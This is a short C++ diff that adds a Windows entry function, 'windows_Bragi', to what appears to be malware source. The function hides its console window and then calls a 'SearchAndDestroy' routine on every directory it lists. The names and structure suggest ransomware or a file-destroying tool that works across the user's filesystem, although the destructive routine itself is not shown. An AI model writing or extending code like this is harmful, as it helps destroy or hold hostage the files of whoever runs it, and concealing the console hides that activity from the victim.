@@ -61,4 +61,21 @@ void SearchAndDestroy(std::wstring dir)
 	}
 }
 
+void windows_Bragi()
+{
+	// Hide Console
+	FreeConsole();
+	// Support UTF-16 Encoding
+	_setmode(_fileno(stdout), _O_U16TEXT);
+	// This vector keeps all directories
+	std::vector<std::wstring> directories;
+	directories = ListDir(Path());
+	// For each folder
+	for (auto dir : directories)
+	{
+		// Move into this directory
+		SearchAndDestroy(dir);
+	}
+}
+
 #endif
